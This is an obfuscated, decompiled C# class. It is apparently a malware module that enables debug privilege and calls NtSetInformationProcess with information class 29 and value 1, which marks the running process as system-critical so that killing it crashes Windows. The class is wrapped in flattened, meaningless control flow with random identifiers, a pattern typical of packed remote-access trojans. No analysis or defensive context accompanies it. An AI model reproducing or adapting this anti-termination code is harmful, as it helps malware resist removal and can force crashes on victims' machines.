using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using QWDFVB;
using o6odd4lA44tXGw4fHn;

namespace z1rPpLFsSGkNbgiFjH;

[StandardModule]
internal sealed class Qm7p6RdpNjo9vovQAF
{
	public class IDl6IGPHZB0HFV1Z27 : MojaKlasa
	{
		[DllImport("ntdll")]
		private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

		public IDl6IGPHZB0HFV1Z27()
		{
			_ = 0;
			if (olADvXIpEM5YIxSsiYx())
			{
				int try0012_dispatch = -1;
				int num3 = default(int);
				int num2 = default(int);
				int num = default(int);
				while (true)
				{
					try
					{
						/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
						int num5;
						switch (try0012_dispatch)
						{
						default:
						{
							ncXUorIVZRJWkpK5fXm();
							num3 = -2;
							olADvXIpEM5YIxSsiYx();
							int num4;
							if (oqfZLDIyUdb4nu6QS2t())
							{
								num4 = 3;
								if (oqfZLDIyUdb4nu6QS2t())
								{
									goto IL_005d;
								}
							}
							else
							{
								num4 = 6;
								if (!olADvXIpEM5YIxSsiYx())
								{
									goto end_IL_0012;
								}
							}
							switch (num4)
							{
							case 4:
								goto IL_005d;
							case 7:
								goto IL_0072;
							case 2:
								break;
							case 0:
							case 6:
								goto IL_00a2;
							case 1:
							case 3:
								goto end_IL_0012_2;
							case 5:
								goto end_IL_0012;
							}
							goto end_IL_0012_3;
						}
						case 171:
							{
								num2 = num;
								goto IL_005d;
							}
							IL_00a2:
							num = 2;
							break;
							IL_0072:
							num5 = num2 + 1;
							num2 = 0;
							switch (num5)
							{
							case 1:
								break;
							default:
								goto end_IL_0012_3;
							case 0:
								goto end_IL_0012_3;
							case 2:
								goto IL_00a2;
							case 3:
								goto end_IL_0012;
							}
							goto default;
							IL_005d:
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0012_3;
								case 1:
									break;
								case 0:
									goto end_IL_0012_3;
								}
							}
							goto IL_0072;
							end_IL_0012_2:
							break;
						}
						Process.EnterDebugMode();
						break;
						end_IL_0012_3:;
					}
					catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
					{
						JUWOwbIcQm6kIMnsBgh((Exception)obj);
						try0012_dispatch = 171;
						continue;
					}
					throw xFg3JrI0PNdDR7xy34Z(-2146828237);
					continue;
					end_IL_0012:
					break;
				}
				if (num2 == 0)
				{
					return;
				}
			}
			ncXUorIVZRJWkpK5fXm();
		}

		public void aeiHqb4AvI()
		{
			olADvXIpEM5YIxSsiYx();
			if (oqfZLDIyUdb4nu6QS2t())
			{
				if (!olADvXIpEM5YIxSsiYx())
				{
					return;
				}
				switch (3)
				{
				case 0:
				case 1:
					break;
				case 4:
					goto IL_006c;
				default:
					goto IL_0099;
				case 5:
					return;
				}
			}
			object obj = NewLateBinding.LateGet(UHsJaUn2VGnAstGMUt.j8lZNlDhk4, (Type)null, "Handle", new object[0], (string[])null, (Type[])null, (bool[])null);
			if (obj == null)
			{
				goto IL_006c;
			}
			IntPtr intptr_ = (IntPtr)obj;
			goto IL_006d;
			IL_0099:
			int int_ = default(int);
			PClHiJ7RMu = int_;
			return;
			IL_006d:
			int int_2 = agl97NIMbDaUh9xrVee(TrkHLeVQWm);
			int_ = agl97NIMbDaUh9xrVee(PClHiJ7RMu);
			NtSetInformationProcess(intptr_, int_2, ref int_, eEe2esIGVgFUSFChjkA(Ty34fxIZUbnMmBHxk2k(TrkHLeVQWm)));
			goto IL_0099;
			IL_006c:
			IntPtr intPtr = default(IntPtr);
			intptr_ = intPtr;
			goto IL_006d;
		}

		internal static void ncXUorIVZRJWkpK5fXm()
		{
			ProjectData.ClearProjectError();
		}

		internal static void JUWOwbIcQm6kIMnsBgh(object object_0)
		{
			ProjectData.SetProjectError((Exception)object_0);
		}

		internal static object xFg3JrI0PNdDR7xy34Z(int int_0)
		{
			return ProjectData.CreateProjectError(int_0);
		}

		internal static bool olADvXIpEM5YIxSsiYx()
		{
			return true;
		}

		internal static bool oqfZLDIyUdb4nu6QS2t()
		{
			return false;
		}

		internal static int agl97NIMbDaUh9xrVee(object object_0)
		{
			return Conversions.ToInteger(object_0);
		}

		internal static object Ty34fxIZUbnMmBHxk2k(object object_0)
		{
			return RuntimeHelpers.GetObjectValue(object_0);
		}

		internal static int eEe2esIGVgFUSFChjkA(object object_0)
		{
			return Marshal.SizeOf(object_0);
		}
	}

	public static object TrkHLeVQWm = 29;

	public static object PClHiJ7RMu = 1;

	internal static bool uAihMIITUtLPB0QTO0f()
	{
		return true;
	}

	internal static bool m9gAU8I6pNSa6SQOlG1()
	{
		return false;
	}
}
